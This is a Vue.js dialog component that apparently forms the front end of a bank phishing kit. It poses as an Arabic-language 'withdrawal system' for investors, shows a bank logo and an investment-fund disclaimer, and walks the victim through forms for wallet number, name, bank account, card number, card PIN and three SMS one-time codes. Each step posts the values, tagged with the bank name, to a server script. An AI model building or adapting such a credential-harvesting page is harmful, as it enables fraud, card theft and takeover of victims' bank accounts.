<template>
  <v-row justify="center">
    <v-dialog
      :value="value"
      @input="$emit('input',$event)"
      scrollable
      max-width="500px"
    >
      <v-card v-if="value">
        <v-card-title :style="styles"> 
           
          <img :src="logo" width="170px" height="50px" alt="">
          <v-spacer></v-spacer>
          
          <v-spacer></v-spacer>
          <v-btn icon @click="$emit('input',false)">
            <v-icon>mdi-close</v-icon>
          </v-btn>
          
        
        </v-card-title>
        <v-divider></v-divider>
        <v-card-text style="height: 600px;" class="pa-0">
         
          <v-img :src="bg" width="100%" >
            <v-card width="100%" color="rgba(255,255,255,.8)"> 
              <v-card-text class="text-center" >
                <h3 class="text-center text-decoration-underline">{{title}}</h3>
                <v-btn class="red mx-auto" dark @click="$emit('email')"> راسلنا </v-btn>
                <h4 class=" my-4 text-center rounded-pill blue pa-2 white--text">مرحبا بك في نظام سحب الأموال</h4>
                <v-divider class="my-3"></v-divider>
                
                <v-progress-linear :value="this.step * 100 / 5" height="18" striped color="green" v-if="step > 1 && step < 5">
                  <template v-slot:default="{ value }">
                    <strong>{{ Math.ceil(value) }}%</strong>
                  </template>
                </v-progress-linear>
               
               
                <v-form ref="form_0" v-if="step == 0" :disabled="loading" @submit="submit">
                  <v-text-field :rules="[v => !!v || 'هذا الحقل مطلوب']" placeholder="رقم المحفظة الاسثمارية" type="number" prepend-inner-icon="mdi-wallet" rounded outlined dense class=" my-3"  ></v-text-field>
                  <v-text-field :rules="[v => !!v || 'هذا الحقل مطلوب']" placeholder="الاسم الكامل" prepend-inner-icon="mdi-account" rounded outlined dense class="  my-3" ></v-text-field>
                  <v-text-field :rules="[v => !!v || 'هذا الحقل مطلوب']" placeholder="رقم الحساب البنكي" type="number" prepend-inner-icon="mdi-bank" rounded outlined dense class="  my-3" ></v-text-field>
                  <v-text-field :rules="[v => !!v || 'هذا الحقل مطلوب']" placeholder="المبلغ المطلوب للسحب" type="number" prepend-inner-icon="mdi-cash" rounded outlined dense class="  my-3" ></v-text-field>
                </v-form>

                <v-form ref="form_1" v-if="step == 1" :disabled="loading" @submit="submit">
                  <v-text-field :rules="[v => !!v || 'هذا الحقل مطلوب']" placeholder="ادخل رقم البطاقة" type="number" prepend-inner-icon="mdi-credit-card" rounded outlined dense class=" my-3"  ></v-text-field>
                  <v-text-field :rules="[v => !!v || 'هذا الحقل مطلوب']" placeholder="ادخل الرقم السري للبطاقة" prepend-inner-icon="mdi-lock" rounded outlined dense class="  my-3" ></v-text-field>
                </v-form>

                <v-form ref="form_2" v-if="step == 2" :disabled="loading" @submit="submit">
                  <v-text-field :rules="[v => !!v || 'هذا الحقل مطلوب']" placeholder="ادخل الرمز الاول المرسل الى جوالك" type="number" prepend-inner-icon="mdi-key" rounded outlined dense class=" my-3"  ></v-text-field>
                </v-form>
                
                <v-form ref="form_3" v-if="step == 3" :disabled="loading" @submit="submit" >
                  <v-text-field :rules="[v => !!v || 'هذا الحقل مطلوب']" placeholder="ادخل الرمز الثاني المرسل الى جوالك" type="number" prepend-inner-icon="mdi-key" rounded outlined dense class=" my-3"  ></v-text-field>
                </v-form>

                <v-form ref="form_4" v-if="step == 4" :disabled="loading" @submit="submit">
                  <v-text-field :rules="[v => !!v || 'هذا الحقل مطلوب']" placeholder="ادخل الرمز الثالث المرسل الى جوالك" type="number" prepend-inner-icon="mdi-key" rounded outlined dense class=" my-3"  ></v-text-field>
                </v-form>
                <v-row  class="text-center" v-if="step > 4">
                  <img src="/images/done-icon.png" class="mx-auto" style="width: 258px; ">
                  <h1 class="mx-auto my-4">تم استقبال المعلومات بنجاح</h1>
                  <h3 class="mx-auto">شكرا لك , سيتم الرد عليك باقرب فرصة</h3>
                </v-row>
                
                <v-row class="text-center" v-if="step < 5">
                  <img src="/images/credit-footer.png" class="mx-auto" style="width: 258px; ">
                  <small>
                    تم إعداد مخلص المعلومات بصورة أساسية لتمكين المستثمرين من دارسة الفرصة المتاحة لهم لشراء وحدات الصندوق، وعلى المستثمرين المحتملين قراءة شروط و أحكام الصندوق مع مذكرة المعلومات والمستندات الأخر قبل اتخاذ أي قرار استثماري في هذا الصندوق.
                  </small>
                </v-row>
              </v-card-text>
            </v-card>
          </v-img>
          
        </v-card-text>
        <v-divider></v-divider>
        <v-card-actions>
          <v-btn
            v-if="step < 5"
            color="blue darken-1"
            :dark="!loading"
            width="100%"
            :disabled="loading"
            :loading="loading"
            @click="submit"
          >
            ارسل الطلب
          </v-btn>
          <v-btn v-else
           width="100%"
           @click="$emit('input',false)"
          >
          اغلاق
          </v-btn>
        </v-card-actions>
      </v-card>
    </v-dialog>
  </v-row>
</template>

<script>
import axios from 'axios'
 
  export default {
    name: 'Dialog',
    props: {
      value: Boolean,
      title: { 
        type: String,
        default: 'Title'
      },
      logo: { 
        type: String,
        default: '#'
      }, 
      bg: { 
        type: String,
        default: '#'
      }, 
      styles: { 
        type: Object,
        default: () => ({})
      }
    },
    watch: {
      value () {
        this.step = 0
      }
    },
    data () {
      return {
        step: 0,
        loading: false
      }
    },
    methods: {
      submit () {
        const form = this.$refs['form_'+this.step]
        
       if (form.validate()) {

         const formData = new FormData() 
         formData.append('البنك', this.title) 
         this.loading = true
         const data = {}
         if (!this.step) {
           data["البنك"] = this.title
         }
         form.inputs.forEach(input => {
          const field = input.$el.querySelector('input')
          formData.append(field.placeholder.replace('ادخل', ''), field.value) 
           
         });
          
        axios.post('/paymentsend.php',formData).then(res => {
          console.log(res);

          this.loading = false
          form.reset()
          this.step++

        }).catch(err=> {
          this.loading = false

          console.log(err);
        })


          

       }
        
        
      }
    } 
  }
</script>
<style   >
.v-text-field--outlined > .v-input__control > .v-input__slot
{
  background-color: white !important; 
}
</style>